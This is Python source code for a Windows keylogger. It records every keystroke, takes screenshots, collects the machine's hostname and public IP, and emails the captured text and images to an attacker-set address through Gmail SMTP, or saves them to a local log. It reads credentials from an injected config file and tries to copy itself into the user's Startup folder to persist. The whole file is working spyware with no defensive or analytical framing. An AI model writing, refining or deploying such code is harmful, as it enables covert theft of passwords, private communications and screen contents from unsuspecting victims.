
from pynput.keyboard import Key, Listener
import smtplib, ssl
import socket   
import requests
import os
import getpass
import sys
import json
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyautogui

keys = []
keys_pressed = 0




USER = os.getlogin()
directory = "SKL"
parent_dir = f"C:/Users/{USER}/AppData/Roaming"
                
path = os.path.join(parent_dir, directory)
try:
        os.mkdir(path)
except:
        pass
try:
        with open(f"{path}/config.json","r") as f:
            json.load(f)
except:
        with open(f"{path}/config.json","w") as r:
             new = {'sender_email': 'sender', 'receiver_email': 'receiver', 'sender_password': 'password', "mode": 'mode'}
             json.dump(new,r)

JsonPath = f"{path}/config.json"


def screenshot(sender_email,receiver_email,sender_password):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "SCREENSHOT"

    # Attach the text message
    msg.attach(MIMEText("scren", 'plain'))

    screenshot = pyautogui.screenshot()
    screenshot.save("./SCREENSHOT.png")
    image_path = "./SCREENSHOT.png"
    with open(image_path, "rb") as image_file:
        image = MIMEImage(image_file.read())
        image.add_header('Content-Disposition', 'attachment', filename="image.jpg")
        msg.attach(image)
        
    # Connect to the SMTP server
    smtp_server = "smtp.gmail.com"  # Change this to your email provider's SMTP server
    smtp_port = 587  # Port for TLS
    smtp_username = sender_email
    smtp_password = sender_password

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)

    # Send the email
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()
    os.remove("./SCREENSHOT.PNG")


#!# -----------------------------------CAPS-LOCK----------------------------------- #!#

def CapsStatus():
    import ctypes
    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False

     
#!# -----------------------------------LOGGER----------------------------------- #!#


def get_ip_address(mode):
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    hostname = socket.gethostname()
    if mode == None:
        return hostname, ip_address
    elif mode == "ip":
        return ip_address
        


def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):                     
  
 
 

    with open(f"{JsonPath}","r") as file:
        parsed = json.load(file)

    mode = parsed['mode']
        
    Key_mode = True
    Email_mode = False
        
    if mode == "email":
        Key_mode = False
        Email_mode = True
    elif mode == "local":
        Key_mode = True
        Email_mode = False
        
    def email(keysGiven):
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = senderEmail
        receiver_email = receiverEmail  
        password = senderPassword
        message = f"""\
            Subject: KEYS 

        {keysGiven}."""

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
 
    
#% ------------- KEY SYSTEM --------------- %#
    def on_press(key):
        
        global keys
        global keys_pressed  
        emailBool = False
        if key == Key.space:
            key = " "
        elif key == Key.backspace:
            key = ""
            keys = keys[: -2]
            keys_pressed =- 2
        elif key == Key.enter:
            key = "\n"
            emailBool = True
        elif key == "'":
            key = "_Apostro4phe_"
        elif key == "\x01":
            key = ""
        elif str(key).startswith("Key."):
            key = ""
            keys_pressed =- 2
        
        
        if CapsStatus(): key = str(key); key = key.upper()  
        
        
#@ ------------- KEY MODE SYSTEM --------------- @#

        keys.append(str(key))
        keys_pressed += 1
        if keys_pressed > 20 and Key_mode == True:   
            file = open(f"./out/Spicy-Logs++", "a") 
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            file.write(str(message))
            keys_pressed = 0 
            keys = []
            
#& ------------- EMAIL MODE SYSTEM --------------- &#

        if emailBool == True and Email_mode == True:
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            email(message)
            screenshot(senderEmail,receiverEmail,senderPassword)
            emailBool = False
            keys = []
    def isMaillable():
        global SendMail
        try:
            host_Data = get_ip_address(None)
            email(f"Started Process || {host_Data}")
            SendMail = True 
        except Exception as e:
            SendMail = False
            print(e)
    with Listener(on_press=on_press) as listener :
        isMaillable()
        listener.join()




def check_config():
    try:
        with open(f"{JsonPath}") as f:
            data = json.load(f)
            try:
                senderEmail = data["sender_email"]
                senderPassword = data["sender_password"]
                receiver_email = data["receiver_email"]
            except:
                return False
            try:
                mode = data["mode"]
                             
            except:
               
                return False
    except Exception as e:
         return False
    return True

try:
    with open(f"inject.json", "r") as Inject:
        parsed = json.load(Inject)
except:
        with open(f"{JsonPath}", "r") as Config:
                parsed = json.load(Config)
                JsenderEmail = parsed["sender_email"]
                JsenderPassword = parsed["sender_password"]
                JreceiverEmail = parsed["receiver_email"]
                Jmode = parsed["mode"]
                       
                           
        START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)

    
    
with open(f"inject.json", "r") as Inject:
        parsed = json.load(Inject)
   
        with open(f"{JsonPath}", "w") as Config:
                    JsenderEmail = parsed["sender_email"]
                    JsenderPassword = parsed["sender_password"]
                    JreceiverEmail = parsed["receiver_email"]
                    Jmode = parsed["mode"]
                    configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
                                            "receiver_email": JreceiverEmail,
                                            "mode": Jmode, "Injector": True}
                                
                    json.dump(configData,Config)   
os.remove("inject.json")            
START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)


#!# -----------------------------------STARTUP----------------------------------- #!#


USER_NAME = getpass.getuser()
Src = (sys.argv[0])
Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
try:
    shutil.move(Src, Dest)
except:
    pass        
